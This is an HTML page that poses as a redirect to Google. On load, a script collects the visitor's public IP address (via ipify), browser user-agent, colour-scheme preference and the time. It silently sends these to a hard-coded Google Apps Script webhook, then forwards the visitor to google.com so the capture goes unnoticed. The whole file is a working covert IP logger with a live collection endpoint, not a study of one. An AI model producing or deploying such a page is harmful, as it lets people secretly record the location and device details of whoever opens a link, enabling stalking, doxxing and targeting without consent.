<!DOCTYPE html>
<html>
<head>
   <script>
    async function track() {
        let device = navigator.userAgent;
        let theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";

        let ipResponse = await fetch("https://api64.ipify.org?format=json");
        let ipData = await ipResponse.json();
        let ip = ipData.ip;

        let webhookURL = "https://script.google.com/macros/s/AKfycbwL20SvPJ1EpVgUJR2vHOBaohV33FdmWooh-ZpXbxy-Ld9ThTBNroJExmhmkwNCO-kT/exec";
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ip: ip, device: device, theme: theme, time: new Date().toLocaleString() })
        });

        window.location.href = "https://google.com"; 
    }
</script>

</head>
<body onload="track()">
</body>
</html>
